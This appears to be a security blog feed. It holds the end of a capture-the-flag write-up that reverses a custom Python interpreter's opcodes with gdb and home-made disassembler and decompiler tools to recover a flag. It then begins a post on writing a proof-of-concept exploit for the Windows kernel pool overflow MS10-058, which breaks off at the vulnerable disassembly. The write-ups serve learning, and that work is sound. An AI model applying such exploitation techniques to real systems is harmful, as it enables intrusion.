0x56c948 &lt;+08&gt;:  0x00    0x02    0x00    0x00    0x00    0x43    0x00    0x00
0x56c950 &lt;+16&gt;:  0x00    0x73    0x14    0x00    0x00    0x00    0x64    0x01
0x56c958 &lt;+24&gt;:  0x00    0x87    0x00    0x00    0x7c    0x00    0x00    0x64
0x56c960 &lt;+32&gt;:  0x01    0x00    0x3c    0x61    0x00    0x00    0x7c    0x00
0x56c968 &lt;+40&gt;:  0x00    0x1b    0x28    0x02    0x00    0x00    0x00    0x4e
0x56c970 &lt;+48&gt;:  0x69    0x01    0x00    0x00    0x00    0x28    0x01    0x00
0x56c978 &lt;+56&gt;:  0x00    0x00    0x74    0x04    0x00    0x00    0x00    0x54
0x56c980 &lt;+64&gt;:  0x72    0x75    0x65    0x28    0x01    0x00    0x00    0x00
0x56c988 &lt;+72&gt;:  0x74    0x0e    0x00    0x00    0x00    0x52    0x6f    0x62
0x56c990 &lt;+80&gt;:  0x65    0x72    0x74    0x5f    0x46    0x6f    0x72    0x73
0x56c998 &lt;+88&gt;:  0x79    0x74    0x68    0x28    0x00    0x00    0x00    0x00
0x56c9a0 &lt;+96&gt;:  0x28    0x00    0x00    0x00    0x00    0x73    0x10    0x00
0x56c9a8 &lt;+104&gt;: 0x00    0x00    0x6f    0x62    0x66    0x75    0x73    0x63
0x56c9b0 &lt;+112&gt;: 0x61    0x74    0x65    0x2f    0x67    0x65    0x6e    0x2e
0x56c9b8 &lt;+120&gt;: 0x70    0x79    0x74    0x03    0x00    0x00    0x00    0x66
0x56c9c0 &lt;+128&gt;: 0x6f    0x6f    0x05    0x00    0x00    0x00    0x73    0x06
0x56c9c8 &lt;+136&gt;: 0x00    0x00    0x00    0x00    0x01    0x06    0x02    0x0a
0x56c9d0 &lt;+144&gt;: 0x01
</code></p>

<p>And obviously you can&rsquo;t use the Python <em>marshal</em> module to load &amp; inspect the resulting object as the author seems to have removed the methods <em>loads</em> and <em>dumps</em>:</p>

<p>```text fuu
overclok@wildout:~/chall/ql-py$ /usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
Python 2.7.8+ (nvcs/newopcodes:a9bd62e4d5f2+, Sep  1 2014, 11:41:46)
[GCC 4.8.2] on linux2
Type &ldquo;help&rdquo;, &ldquo;copyright&rdquo;, &ldquo;credits&rdquo; or &ldquo;license&rdquo; for more information.</p>

<blockquote><blockquote><blockquote><p>import marshal
dir(marshal)
[&lsquo;<strong>doc</strong>&rsquo;, &lsquo;<strong>name</strong>&rsquo;, &lsquo;<strong>package</strong>&rsquo;, &lsquo;version&rsquo;]
```</p></blockquote></blockquote></blockquote>

<p>We could still try to run the marshaled string in our fresh compiled original Python though:
```python unmarshal in an original Python278</p>

<blockquote><blockquote><blockquote><p>import marshal
part_1 = marshal.loads(&lsquo;c\x00\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00C\x00\x00\x00s\x14\x00\x00\x00d\x01\x00\x87\x00\x00|\x00\x00d\x01\x00&lt;a\x00\x00|\x00\x00\x1b(\x02\x00\x00\x00Ni\x01\x00\x00\x00(\x01\x00\x00\x00t\x04\x00\x00\x00True(\x01\x00\x00\x00t\x0e\x00\x00\x00Robert_Forsyth(\x00\x00\x00\x00(\x00\x00\x00\x00s\x10\x00\x00\x00obfuscate/gen.pyt\x03\x00\x00\x00foo\x05\x00\x00\x00s\x06\x00\x00\x00\x00\x01\x06\x02\n\x01&rsquo;)
part_1.co_code
&rsquo;d\x01\x00\x87\x00\x00|\x00\x00d\x01\x00&lt;a\x00\x00|\x00\x00\x1b'
part_1.co_varnames
(&lsquo;Robert_Forsyth&rsquo;,)
part_1.co_names
(&lsquo;True&rsquo;,)
```</p></blockquote></blockquote></blockquote>

<p>We can also go further by trying to create a function out of this code object, to call it and/or to disassemble it even:
```python fuu2</p>

<blockquote><blockquote><blockquote><p>from types import FunctionType
def a():
&hellip;     pass
&hellip;
f = FunctionType(part_1, a.func_globals)
f()
Traceback (most recent call last):
  File &ldquo;<stdin>&rdquo;, line 1, in <module>
  File &ldquo;obfuscate/gen.py&rdquo;, line 8, in foo
UnboundLocalError: local variable &lsquo;Robert_Forsyth&rsquo; referenced before assignment
import dis
dis.dis(f)
  6           0 LOAD_CONST               1 (1)</p>

<pre><code>          3 LOAD_CLOSURE             0
</code></pre>

<p>Traceback (most recent call last):
  File &ldquo;<stdin>&rdquo;, line 1, in <module>
  File &ldquo;/home/overclok/chall/ql-py/Python-2.7.8/Lib/dis.py&rdquo;, line 43, in dis</p>

<pre><code>disassemble(x)
</code></pre>

<p>  File &ldquo;/home/overclok/chall/ql-py/Python-2.7.8/Lib/dis.py&rdquo;, line 107, in disassemble</p>

<pre><code>print '(' + free[oparg] + ')',
</code></pre>

<p>IndexError: tuple index out of range
```</p></blockquote></blockquote></blockquote>

<h3>Introducing <em>dpy.py</em></h3>

<p>All right, as expected this does not work at all: seems like the custom interpreter uses different opcodes which the original virtual CPU doesn&rsquo;t know about.
Anyway, let&rsquo;s have a look at this object directly from memory because we like low level things (remember?):</p>

<p>```text inspecting the code object created
gdb$ p <em>(PyObject</em>)$rax
$3 = {ob_refcnt = 0x1, ob_type = 0x7d3da0 &lt;PyCode_Type>}</p>

<p>; Ok it is a code object, let&rsquo;s dump entirely the object now
gdb$ p <em>(PyCodeObject</em>)$rax
$4 = {
  ob_refcnt = 0x1,
  ob_type = 0x7d3da0 &lt;PyCode_Type>,
  co_argcount = 0x0, co_nlocals = 0x1, co_stacksize = 0x2, co_flags = 0x43,
  co_code = 0x7ffff7f09df0,
  co_consts = 0x7ffff7ee2908,
  co_names = 0x7ffff7f8e390,
  co_varnames = 0x7ffff7f09ed0,
  co_freevars = 0x7ffff7fa7050, co_cellvars = 0x7ffff7fa7050,
  co_filename = 0x7ffff70a9b58,
  co_name = 0x7ffff7f102b0,
  co_firstlineno = 0x5,
  co_lnotab = 0x7ffff7e59900,
  co_zombieframe = 0x0,
  co_weakreflist = 0x0
}
```</p>

<p>Perfect, and you can do that for every single field of this structure:</p>

<ul>
<li>to dump the bytecode,</li>
<li>the constants used,</li>
<li>the variable names,</li>
<li>etc.</li>
</ul>


<p>Yes, this is annoying, very much so. That is exactly why there is <em><a href="https://github.com/0vercl0k/stuffz/blob/master/ql-chall-python-2014/dpy.py">dpy</a></em>, a <em>GDB</em> Python command I wrote to dump Python objects in a much easy way directly from memory:</p>

<p>```text show-casing dpy
gdb$ r
Starting program: /usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
[&hellip;]</p>

<blockquote><blockquote><blockquote><p>a = { 1 : [1,2,3], &lsquo;two&rsquo; : 31337, 3 : (1,&lsquo;lul&rsquo;, [3,4,5])}
print hex(id(a))
0x7ffff7ef1050
^C
Program received signal SIGINT, Interrupt.
gdb$ dpy 0x7ffff7ef1050
dict &ndash;> {1: [1, 2, 3], 3: (1, &lsquo;lul&rsquo;, [3, 4, 5]), &lsquo;two&rsquo;: 31337}
```</p></blockquote></blockquote></blockquote>

<h3>I need a disassembler now dad</h3>

<p>But let&rsquo;s get back to our second breakpoint now, and see what <em>dpy</em> gives us with the resulting code object:</p>

<p><code>text dpy code object
gdb$ dpy $rax
code -&gt; {'co_code': 'd\x01\x00\x87\x00\x00|\x00\x00d\x01\x00&lt;a\x00\x00|\x00\x00\x1b',
 'co_consts': (None, 1),
 'co_name': 'foo',
 'co_names': ('True',),
 'co_varnames': ('Robert_Forsyth',)}
</code></p>

<p>Because we know the bytecode used by this interpreter is different than the original one, we have to figure out the equivalent between the instructions and their opcodes:</p>

<ol>
<li>Either we can reverse-engineer each handler of the virtual CPU,</li>
<li>Either we can create functions in both interpreters, disassemble those (thanks to <em>dpy</em>) and match the equivalent opcodes</li>
</ol>


<p>I guess we can mix both of them to be more efficient:</p>

<p>```text deducing equivalent opcodes
Python 2.7.8 (default, Sep  5 2014, 00:13:07)
[GCC 4.8.2] on linux2
Type &ldquo;help&rdquo;, &ldquo;copyright&rdquo;, &ldquo;credits&rdquo; or &ldquo;license&rdquo; for more information.</p>

<blockquote><blockquote><blockquote><p>def assi(x):
&hellip;     x = &lsquo;hu&rsquo;
&hellip;
def add(x):
&hellip;     return x + 31337
&hellip;
import dis
dis.dis(assi)
  2           0 LOAD_CONST               1 (&lsquo;hu&rsquo;)</p>

<pre><code>          3 STORE_FAST               0 (x)
          6 LOAD_CONST               0 (None)
          9 RETURN_VALUE
</code></pre>

<p>dis.dis(add)
  2           0 LOAD_FAST                0 (x)</p>

<pre><code>          3 LOAD_CONST               1 (31337)
          6 BINARY_ADD
          7 RETURN_VALUE
</code></pre>

<p>assi.func_code.co_code
&rsquo;d\x01\x00}\x00\x00d\x00\x00S'
add.func_code.co_code
&lsquo;|\x00\x00d\x01\x00\x17S&rsquo;</p></blockquote></blockquote></blockquote>

<h1>In the custom interpreter</h1>

<p>gdb$ r
Starting program: /usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
[Thread debugging using libthread_db enabled]
Using host libthread_db library &ldquo;/lib/x86_64-linux-gnu/libthread_db.so.1&rdquo;.
Python 2.7.8+ (nvcs/newopcodes:a9bd62e4d5f2+, Sep  1 2014, 11:41:46)
[GCC 4.8.2] on linux2
Type &ldquo;help&rdquo;, &ldquo;copyright&rdquo;, &ldquo;credits&rdquo; or &ldquo;license&rdquo; for more information.</p>

<blockquote><blockquote><blockquote><p>def assi(x):
&hellip;     x = &lsquo;hu&rsquo;
&hellip;
def add(x):
&hellip;     return x + 31337
&hellip;
print hex(id(assi))
0x7ffff7f0c578
print hex(id(add))
0x7ffff7f0c5f0
^C
Program received signal SIGINT, Interrupt.
gdb$ dpy 0x7ffff7f0c578
function &ndash;> {&lsquo;func_code&rsquo;: {&lsquo;co_code&rsquo;: &rsquo;d\x01\x00\x87\x00\x00d\x00\x00\x1b',</p>

<pre><code>           'co_consts': (None, 'hu'),
           'co_name': 'assi',
           'co_names': (),
           'co_varnames': ('x',)},
</code></pre>

<p> &lsquo;func_dict&rsquo;: None,
 &lsquo;func_doc&rsquo;: None,
 &lsquo;func_module&rsquo;: &lsquo;<strong>main</strong>&rsquo;,
 &lsquo;func_name&rsquo;: &lsquo;assi&rsquo;}
gdb$ dpy 0x7ffff7f0c5f0
function &ndash;> {&lsquo;func_code&rsquo;: {&lsquo;co_code&rsquo;: &lsquo;\x8f\x00\x00d\x01\x00=\x1b&rsquo;,</p>

<pre><code>           'co_consts': (None, 31337),
           'co_name': 'add',
           'co_names': (),
           'co_varnames': ('x',)},
</code></pre>

<p> &lsquo;func_dict&rsquo;: None,
 &lsquo;func_doc&rsquo;: None,
 &lsquo;func_module&rsquo;: &lsquo;<strong>main</strong>&rsquo;,
 &lsquo;func_name&rsquo;: &lsquo;add&rsquo;}</p></blockquote></blockquote></blockquote>

<p> # From here we have:
 # 0x64 &ndash;> LOAD_CONST
 # 0x87 &ndash;> STORE_FAST
 # 0x1b &ndash;> RETURN_VALUE
 # 0x8f &ndash;> LOAD_FAST
 # 0x3d &ndash;> BINARY_ADD
```</p>

<p>OK I think you got the idea, and if you don&rsquo;t manage to find all of them you can just debug the virtual CPU by putting a software breakpoint <em>@0x4b0960</em>:
<code>text opcode fetching
=&gt; 0x4b0923 &lt;PyEval_EvalFrameEx+867&gt;:   movzx  eax,BYTE PTR [r13+0x0]
</code></p>

<p>For the interested readers: there is at least one interesting opcode that you wouldn&rsquo;t find in a normal Python interpreter, check what <em>0xA0</em> is doing especially when followed by <em>0x87</em> :&ndash;).</p>

<h3>Back to the first marshaled function with all our tooling now</h3>

<p>Thanks to our <a href="https://github.com/0vercl0k/stuffz/blob/master/ql-chall-python-2014/disassembler_ql_chall.py">disassembler.py</a>, we can now disassemble easily the first part:</p>

<p>```text disassembling
PS D:\Codes\ql-chall-python-2014> python .\disassembler_ql_chall.py
  6           0 LOAD_CONST               1 (1)</p>

<pre><code>          3 STORE_FAST               0 (Robert_Forsyth)
</code></pre>

<p>  8           6 LOAD_GLOBAL              0 (True)</p>

<pre><code>          9 LOAD_CONST               1 (1)
         12 INPLACE_ADD
         13 STORE_GLOBAL             0 (True)
</code></pre>

<p>  9          16 LOAD_GLOBAL              0 (True)</p>

<pre><code>         19 RETURN_VALUE
</code></pre>

<p>================================================================================
```</p>

<p>It seems the author has been really (too) kind with us: the function is really small and we can rewrite it in Python straightaway:</p>

<p>```python part_1
def part1():</p>

<pre><code>global True
Robert_Forsyth = 1
True += 1
</code></pre>

<p>```</p>

<p>You can also make sure with <a href="https://github.com/0vercl0k/stuffz/blob/master/ql-chall-python-2014/dpy.py">dpy</a> that the code of <em>part1</em> is the exact same than the unmarshaled function we dumped earlier.</p>

<p>```text part_1 successfully decompiled</p>

<blockquote><blockquote><blockquote><p>def part_1():
&hellip;  global True
&hellip;  Robert_Forsyth = 1
&hellip;  True += 1
&hellip;
print hex(id(part_1))
0x7ffff7f0f578
^C
Program received signal SIGINT, Interrupt.
gdb$ dpy 0x7ffff7f0f578
function &ndash;> {&lsquo;func_code&rsquo;: {&lsquo;co_code&rsquo;: &rsquo;d\x01\x00\x87\x00\x00|\x00\x00d\x01\x00&lt;a\x00\x00d\x00\x00\x1b',</p>

<pre><code>           'co_consts': (None, 1),
           'co_name': 'part_1',
           'co_names': ('True',),
           'co_varnames': ('Robert_Forsyth',)},
</code></pre>

<p> &lsquo;func_dict&rsquo;: None,
 &lsquo;func_doc&rsquo;: None,
 &lsquo;func_module&rsquo;: &lsquo;<strong>main</strong>&rsquo;,
 &lsquo;func_name&rsquo;: &lsquo;part_1&rsquo;}
```</p></blockquote></blockquote></blockquote>

<h3>Run my bytecode</h3>

<p>The second part is also quite simple according to the following disassembly:</p>

<p>```text run my bytecode
gdb$ disass run_me
Dump of assembler code for function run_me:
[&hellip;]
   ; Parses the arguments we gave, it expects a string object
   0x0000000000513da0 &lt;+16>:    lea    rcx,[rsp+0x10]
   0x0000000000513da5 &lt;+21>:    mov    rdx,rsp
   0x0000000000513da8 &lt;+24>:    call   0x4cf430 &lt;PyArg_ParseTuple>
   0x0000000000513dad &lt;+29>:    xor    edx,edx
   0x0000000000513daf &lt;+31>:    test   eax,eax
   0x0000000000513db1 &lt;+33>:    je     0x513e5e &lt;run_me+206></p>

<p>   0x0000000000513db7 &lt;+39>:    mov    rax,QWORD PTR [rip+0x2d4342]
   0x0000000000513dbe &lt;+46>:    mov    esi,0x91
   0x0000000000513dc3 &lt;+51>:    mov    edi,0x56c940
   0x0000000000513dc8 &lt;+56>:    mov    rax,QWORD PTR [rax+0x10]
   0x0000000000513dcc &lt;+60>:    mov    rbx,QWORD PTR [rax+0x30]</p>

<p>[&hellip;]
   ; Part1
[&hellip;]</p>

<p>   0x0000000000513df7 &lt;+103>:   mov    rsi,QWORD PTR [rsp+0x10]
   0x0000000000513dfc &lt;+108>:   mov    rdi,QWORD PTR [rsp]
   ; Uses the string passed as argument to run_me as a marshaled object
   ; PyObject<em> PyMarshal_ReadObjectFromString(char </em>string, Py_ssize_t len)
   0x0000000000513e00 &lt;+112>:   call   0x4dc020 &lt;PyMarshal_ReadObjectFromString></p>

<p>   0x0000000000513e05 &lt;+117>:   mov    rsi,rbx
   0x0000000000513e08 &lt;+120>:   mov    rdi,rax</p>

<p>   ; Creates a function out of it
   0x0000000000513e0b &lt;+123>:   call   0x52c630 &lt;PyFunction_New>
   0x0000000000513e10 &lt;+128>:   xor    edi,edi
   0x0000000000513e12 &lt;+130>:   mov    rbp,rax
   0x0000000000513e15 &lt;+133>:   call   0x478f80 &lt;PyTuple_New></p>

<p>   ; Calls it
   ; PyObject<em> PyObject_Call(PyObject </em>callable_object, PyObject <em>args, PyObject </em>kw)
   0x0000000000513e1a &lt;+138>:   xor    edx,edx
   0x0000000000513e1c &lt;+140>:   mov    rdi,rbp
   0x0000000000513e1f &lt;+143>:   mov    rsi,rax
   0x0000000000513e22 &lt;+146>:   call   0x422b40 &lt;PyObject_Call>
```</p>

<p>Basically, the string you pass to <em>run_me</em> is treated as a marshaled function: it explains why you get <em>segmentation faults</em> when you call the function with random strings.
We can just <em>jump over</em> that part of the function because we don&rsquo;t really need it so far: <em>set $eip=0x513e27</em> and job done!</p>

<h3>Second &amp; last marshaled function</h3>

<p>By the way I hope you are still reading &mdash; hold tight, we are nearly done!
Let&rsquo;s dump the function object with <a href="https://github.com/0vercl0k/stuffz/blob/master/ql-chall-python-2014/dpy.py">dpy</a>:</p>

<p>```text Second part inspection with dpy
&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;[regs]
  RAX: 0x00007FFFF7FA7050  RBX: 0x00007FFFF7F0F758  RBP: 0x00000000007B0270  RSP: 0x00007FFFFFFFE040  o d I t s Z a P c
  RDI: 0x00007FFFF7F0F758  RSI: 0x00007FFFF7FA7050  RDX: 0x0000000000000000  RCX: 0x0000000000000828  RIP: 0x0000000000513E56
  R8 : 0x0000000000880728  R9 : 0x00007FFFF7F8D908  R10: 0x00007FFFF7FA7050  R11: 0x00007FFFF7FA7050  R12: 0x00007FFFF7FD0F48
  R13: 0x00000000007EF0A0  R14: 0x00007FFFF7F3CB00  R15: 0x00007FFFF7F07ED0
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B
&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;[code]</p>

<h2>=> 0x513e56 &lt;run_me+198>:       call   0x422b40 &lt;PyObject_Call></h2>

<p>gdb$ dpy $rdi
function &ndash;> {&lsquo;func_code&rsquo;: {&lsquo;co_code&rsquo;: &lsquo;\x7c\x00\x00\x64\x01\x00\x6b\x03\x00\x72\x19\x00\x7c\x00\x00\x64\x02\x00\x55\x61\x00\x00\x6e\x6e\x00\x7c\x01\x00\x6a\x02\x00\x64\x03\x00\x6a\x03\x00\x64\x04\x00\x77\x00\x00\xa0\x05\x00\xc8\x06\x00\xa0\x07\x00\xb2\x08\x00\xa0\x09\x00\xea\x0a\x00\xa0\x0b\x00\x91\x08\x00\xa0\x0c\x00\x9e\x0b\x00\xa0\x0d\x00\xd4\x08\x00\xa0\x0e\x00\xd5\x0f\x00\xa0\x10\x00\xdd\x11\x00\xa0\x07\x00\xcc\x08\x00\xa0\x12\x00\x78\x0b\x00\xa0\x13\x00\x87\x0f\x00\xa0\x14\x00\x5b\x15\x00\xa0\x16\x00\x97\x17\x00\x67\x1a\x00\x53\x86\x01\x00\x86\x01\x00\x86\x01\x00\x54\x64\x00\x00\x1b&rsquo;,
   &lsquo;co_consts&rsquo;: (None,</p>

<pre><code> 3,
 1,
 '',
 {'co_code': '\\x8f\\x00\\x00\\x5d\\x15\\x00\\x87\\x01\\x00\\x7c\\x00\\x00\\x8f\\x01\\x00\\x64\\x00\\x00\\x4e\\x86\\x01\\x00\\x59\\x54\\x71\\x03\\x00\\x64\\x01\\x00\\x1b',
  'co_consts': (13, None),
  'co_name': '&lt;genexpr&gt;',
  'co_names': ('chr',),
  'co_varnames': ('.0', '_')},
 75,
 98,
 127,
 45,
 89,
 101,
 104,
 67,
 122,
 65,
 120,
 99,
 108,
 95,
 125,
 111,
 97,
 100,
 110),
</code></pre>

<p>   &lsquo;co_name&rsquo;: &lsquo;foo&rsquo;,
   &lsquo;co_names&rsquo;: (&lsquo;True&rsquo;, &lsquo;quarkslab&rsquo;, &lsquo;append&rsquo;, &lsquo;join&rsquo;),
   &lsquo;co_varnames&rsquo;: ()},
 &lsquo;func_dict&rsquo;: None,
 &lsquo;func_doc&rsquo;: None,
 &lsquo;func_module&rsquo;: &lsquo;<strong>main</strong>&rsquo;,
 &lsquo;func_name&rsquo;: &lsquo;foo&rsquo;}
```</p>

<p>Even before studying / disassembling the code, we see some interesting things: <em>chr</em>, <em>quarkslab</em>, <em>append</em>, <em>join</em>, etc. It definitely feels like that function is generating the flag we are looking for.</p>

<p>Seeing <em>append</em>, <em>join</em> and another code object (in <em>co_consts</em>) suggests that a <em>generator</em> is used to populate the variable <em>quarkslab</em>. We also can guess that the bunch of bytes we are seeing may be the flag encoded/encrypted &mdash; anyway we can infer <strong>too much information to me</strong> just by dumping/looking at the object.</p>

<p>Let&rsquo;s use our magic <a href="https://github.com/0vercl0k/stuffz/blob/master/ql-chall-python-2014/disassembler_ql_chall.py">disassembler.py</a> to see those codes objects:</p>

<p>```text part2 &amp; its generator disassembled
 19     >>    0 LOAD_GLOBAL              0 (True)</p>

<pre><code>          3 LOAD_CONST               1 (3)
          6 COMPARE_OP               3 (!=)
          9 POP_JUMP_IF_FALSE       25
</code></pre>

<p> 20          12 LOAD_GLOBAL              0 (True)</p>

<pre><code>         15 LOAD_CONST               2 (1)
         18 INPLACE_SUBTRACT
         19 STORE_GLOBAL             0 (True)
         22 JUMP_FORWARD           110 (to 135)
</code></pre>

<p> 22     >>   25 LOAD_GLOBAL              1 (quarkslab)</p>

<pre><code>         28 LOAD_ATTR                2 (append)
         31 LOAD_CONST               3 ('')
         34 LOAD_ATTR                3 (join)
         37 LOAD_CONST               4 (&lt;code object &lt;genexpr&gt; at 023A84A0, file "obfuscate/gen.py", line 22&gt;)
         40 MAKE_FUNCTION            0
         43 LOAD_CONST2              5 (75)
         46 LOAD_CONST3              6 (98)
         49 LOAD_CONST2              7 (127)
         52 LOAD_CONST5              8 (45)
         55 LOAD_CONST2              9 (89)
         58 LOAD_CONST4             10 (101)
         61 LOAD_CONST2             11 (104)
         64 LOAD_CONST6              8 (45)
         67 LOAD_CONST2             12 (67)
         70 LOAD_CONST7             11 (104)
         73 LOAD_CONST2             13 (122)
         76 LOAD_CONST8              8 (45)
         79 LOAD_CONST2             14 (65)
         82 LOAD_CONST10            15 (120)
         85 LOAD_CONST2             16 (99)
         88 LOAD_CONST9             17 (108)
         91 LOAD_CONST2              7 (127)
         94 LOAD_CONST11             8 (45)
         97 LOAD_CONST2             18 (95)
        100 LOAD_CONST12            11 (104)
        103 LOAD_CONST2             19 (125)
        106 LOAD_CONST16            15 (120)
        109 LOAD_CONST2             20 (111)
        112 LOAD_CONST14            21 (97)
        115 LOAD_CONST2             22 (100)
        118 LOAD_CONST15            23 (110)
        121 BUILD_LIST              26
        124 GET_ITER
        125 CALL_FUNCTION            1
        128 CALL_FUNCTION            1
        131 CALL_FUNCTION            1
        134 POP_TOP
    &gt;&gt;  135 LOAD_CONST               0 (None)
        138 RETURN_VALUE
</code></pre>

<p>================================================================================
 22           0 LOAD_FAST                0 (.0)</p>

<pre><code>    &gt;&gt;    3 FOR_ITER                21 (to 27)
          6 LOAD_CONST16             1 (None)
          9 LOAD_GLOBAL              0 (chr)
         12 LOAD_FAST                1 (_)
         15 LOAD_CONST               0 (13)
         18 BINARY_XOR
         19 CALL_FUNCTION            1
         22 YIELD_VALUE
         23 POP_TOP
         24 JUMP_ABSOLUTE            3
    &gt;&gt;   27 LOAD_CONST               1 (None)
         30 RETURN_VALUE
</code></pre>

<p>```</p>

<p>Great, that definitely sounds like what we described earlier.</p>

<h3>I need a decompiler dad</h3>

<p>Now because we really like to hack things, I decided to patch a Python decompiler to support the opcodes defined in this challenge in order to fully decompile the codes we saw so far.</p>

<p>I won&rsquo;t bother you with how I managed to do it though ; long story short: it is built it on top of <a href="https://github.com/gdelugre/fupy">fupy.py</a> which is a readable hackable Python 2.7 decompiler written by the awesome <a href="https://github.com/gdelugre">Guillaume Delugre</a> &mdash; Cheers to my mate <a href="https://twitter.com/Myst3rie">@Myst3rie</a> for telling about this project!</p>

<p>So here is <a href="https://github.com/0vercl0k/stuffz/blob/master/ql-chall-python-2014/decompiler_ql_chall.py">decompiler.py</a> working on the two code objects of the challenge:</p>

<p>```text decompiiiiiilation
PS D:\Codes\ql-chall-python-2014> python .\decompiler_ql_chall.py
PART1 ====================
Robert_Forsyth = 1
True = True + 1</p>

<p>PART2 ====================
if True != 3:</p>

<pre><code>True = True - 1
</code></pre>

<p>else:</p>

<pre><code>quarkslab.append(''.join(chr(_ ^ 13) for _ in [75, 98, 127, 45, 89, 101, 104, 45, 67, 104, 122, 45, 65, 120, 99, 108, 127, 45, 95, 104, 125, 120, 111, 97, 100, 110]))
</code></pre>

<p>```</p>

<p>Brilliant &mdash; time to get a flag now :&ndash;).
Here are the things we need to do:</p>

<ol>
<li>Set <em>True</em> to 2 (so that it&rsquo;s equal to 3 in the part 2)</li>
<li>Declare a <em>list</em> named <em>quarkslab</em></li>
<li>Jump over the middle part of the function where it will run the bytecode you gave as argument (or give a valid marshaled string that won&rsquo;t crash the interpreter)</li>
<li>Profit!</li>
</ol>


<p>```text win
overclok@wildout:~/chall/ql-py$ /usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
Python 2.7.8+ (nvcs/newopcodes:a9bd62e4d5f2+, Sep  1 2014, 11:41:46)
[GCC 4.8.2] on linux2
Type &ldquo;help&rdquo;, &ldquo;copyright&rdquo;, &ldquo;credits&rdquo; or &ldquo;license&rdquo; for more information.</p>

<blockquote><blockquote><blockquote><p>True = 2
quarkslab = list()
import do_not_run_me as v
v.run_me(&ldquo;c\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00C\x00\x00\x00s\x04\x00\x00\x00d\x00\x00\x1B(\x01\x00\x00\x00N(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x07\x00\x00\x00rstdinrt\x01\x00\x00\x00a\x01\x00\x00\x00s\x02\x00\x00\x00\x00\x01&rdquo;)
quarkslab
[&lsquo;For The New Lunar Republic&rsquo;]
```</p></blockquote></blockquote></blockquote>

<h1>Conclusion</h1>

<p>This was definitely entertaining, so thanks to Serge and <a href="http://blog.quarkslab.com/">Quarkslab</a> for putting this challenge together! I feel like it would have been cooler to force people to write a disassembler or/and a decompiler to study the code of <em>run_me</em> though ; because as I mentioned at the very beginning of the article you don&rsquo;t really need any tool to guess/know roughly where the flag is, and how to get it. I still did write all those little scripts because it was fun and cool that&rsquo;s all!</p>

<p>Anyway, the codes I talked about are available on my github as usual if you want to have a look at them. You can also have look at <a href="https://github.com/0vercl0k/stuffz/blob/master/Python's%20internals/wildfire.py">wildfire.py</a> if you like weird/wild/whatever Python beasts!</p>

<p>That&rsquo;s all for today guys, I hope it wasn&rsquo;t too long and that you did enjoy the read.</p>

<p>By the way, we still think it would be cool to have more people posting on that blog, so if you are interested feel free to <a href="https://doar-e.github.io/about/">contact us</a>!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[First dip into the kernel pool : MS10-058]]></title>
    <link href="http://doar-e.github.io/blog/2014/03/11/first-dip-into-the-kernel-pool-ms10-058/"/>
    <updated>2014-03-11T02:52:37-07:00</updated>
    <id>http://doar-e.github.io/blog/2014/03/11/first-dip-into-the-kernel-pool-ms10-058</id>
    <content type="html"><![CDATA[<h1>Introduction</h1>

<p>I am currently playing with pool-based memory corruption vulnerabilities. That’s why I wanted to program a PoC exploit for the vulnerability presented by Tarjei Mandt during his first talk “Kernel Pool Exploitation on Windows 7” <a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf">[3]</a>. I think it&rsquo;s a good exercise to start learning about pool overflows.</p>

<h1>Forewords</h1>

<p>If you want to experiment with this vulnerability, you should read <a href="http://www.itsecdb.com/oval/definition/oval/gov.nist.USGCB.patch/def/11689/MS10-058-Vulnerabilities-in-TCP-IP-Could-Allow-Elevation-of.html">[1]</a> and be sure to have a vulnerable system. I tested my exploit on a VM with Windows 7 32 bits with tcpip.sys 6.1.7600.16385. The Microsoft bulletin dealing with this vulnerability is MS10-058. It has been found by Matthieu Suiche <a href="http://technet.microsoft.com/fr-fr/security/bulletin/ms10-058">[2]</a> and was used as an example on Tarjei Mandt’s paper <a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf">[3]</a>.</p>

<h1>Triggering the flaw</h1>

<p>An integer overflow in <em>tcpip!IppSortDestinationAddresses</em> allows to allocate a wrong-sized non-paged pool memory chunk. Below you can see the diff between the vulnerable version and the patched version.</p>

<p><img class="center" src="/images/MS10-058/diff.png"></p>

<div class='entry-content-toc'></div>




<!--more-->


<p>So basically the flaw is merely an integer overflow that triggers a pool overflow.</p>

<p><code>text
IppSortDestinationAddresses(x,x,x)+29   imul    eax, 1Ch
IppSortDestinationAddresses(x,x,x)+2C   push    esi
IppSortDestinationAddresses(x,x,x)+2D   mov     esi, ds:__imp__ExAllocatePoolWithTag@12
IppSortDestinationAddresses(x,x,x)+33   push    edi
IppSortDestinationAddresses(x,x,x)+34   mov     edi, 73617049h
IppSortDestinationAddresses(x,x,x)+39   push    edi   
IppSortDestinationAddresses(x,x,x)+3A   push    eax  
IppSortDestinationAddresses(x,x,x)+3B   push    ebx           
